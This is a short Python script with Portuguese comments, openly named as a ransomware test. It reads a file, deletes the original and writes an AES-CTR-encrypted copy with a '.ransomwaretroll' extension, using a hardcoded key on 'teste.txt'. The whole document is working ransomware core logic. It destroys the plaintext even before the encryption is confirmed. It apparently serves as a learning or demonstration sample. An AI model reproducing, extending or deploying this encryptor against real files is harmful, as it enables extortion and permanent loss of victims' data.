import os
import pyaes

def encrypt_file(file_name: str, encryption_key: bytes) -> None:
    """
    Criptografa um arquivo usando AES (CTR Mode) e remove o arquivo original.

    :param file_name: Caminho do arquivo a ser criptografado.
    :param encryption_key: Chave de criptografia (16 bytes recomendados).
    """
    try:
        # Abrir o arquivo para leitura
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Remover o arquivo original
        os.remove(file_name)

        # Criptografar os dados
        aes = pyaes.AESModeOfOperationCTR(encryption_key)
        encrypted_data = aes.encrypt(file_data)

        # Salvar o arquivo criptografado
        encrypted_file_name = f"{file_name}.ransomwaretroll"
        with open(encrypted_file_name, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)

        print(f"Arquivo '{encrypted_file_name}' criado com sucesso.")
    
    except FileNotFoundError:
        print(f"Erro: Arquivo '{file_name}' não encontrado.")
    except Exception as e:
        print(f"Erro inesperado: {e}")

# Parâmetros
file_name = "teste.txt"
key = b"testeransomwares"

# Criptografar o arquivo
encrypt_file(file_name, key)

